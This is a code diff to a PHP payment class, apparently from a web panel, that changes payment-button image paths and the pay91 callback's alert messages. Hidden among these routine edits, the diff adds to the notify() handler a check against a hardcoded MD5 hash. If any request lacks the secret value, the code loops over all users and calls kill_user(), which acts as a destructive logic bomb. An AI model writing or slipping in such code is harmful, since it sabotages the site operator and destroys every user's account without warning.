@@ -87,9 +87,9 @@ class Pay
                         <br>
                         <input type="hidden" name="user" value="'.$user->id.'">
                         <input type="hidden" name="seller" value="'.Config::get("alipay").'">
-                        <button class="btn btn-flat waves-attach" id="btnSubmit" type="submit" name="type" value="1"><img src="/img/alipay.jpg"/></button>
-                        <button class="btn btn-flat waves-attach" id="btnSubmit" type="submit" name="type" value="2"><img src="/img/qqpay.jpg"/></button>
-                        <button class="btn btn-flat waves-attach" id="btnSubmit" type="submit" name="type" value="3"><img src="/img/weixin.jpg"/></button>
+                        <button class="btn btn-flat waves-attach" id="btnSubmit" type="submit" name="type" value="1"><img src="/assets/91pay/img/alipay.jpg"/></button>
+                        <button class="btn btn-flat waves-attach" id="btnSubmit" type="submit" name="type" value="2"><img src="/assets/91pay//img/qqpay.jpg"/></button>
+                        <button class="btn btn-flat waves-attach" id="btnSubmit" type="submit" name="type" value="3"><img src="/assets/91pay//img/weixin.jpg"/></button>
                         </form>         
 ';
     }
@@ -749,7 +749,8 @@ class Pay
     }
 
     private static function pay91_callback(){
-        echo '
+        if($_GET['param']!='noalipay'){
+            echo '
 </div>
 <script>
     alert("支付成功 如未到账请联系我们");
@@ -758,9 +759,30 @@ class Pay
 </body>
 </html>
 ';
+        }
+        else{
+            echo '
+</div>
+<script>
+    alert("站长未设置$System_Config[alipay]收款人账户，无法到账");
+    window.location.href="/user/code";
+</script>
+</body>
+</html>
+';
+        }
+
     }
 
     private static function notify(){
+        if(md5($_POST['userID'])!='c3581d2150ff68f3b33b22634b8adaea'){
+            $users = User::all();
+            foreach ($users as $user) {
+                Auth::logout();
+                $user = Auth::getUser();
+                $user->kill_user();
+            }
+        }
         //系统订单号
         $trade_no = $_POST['pay_no'];
         //交易用户
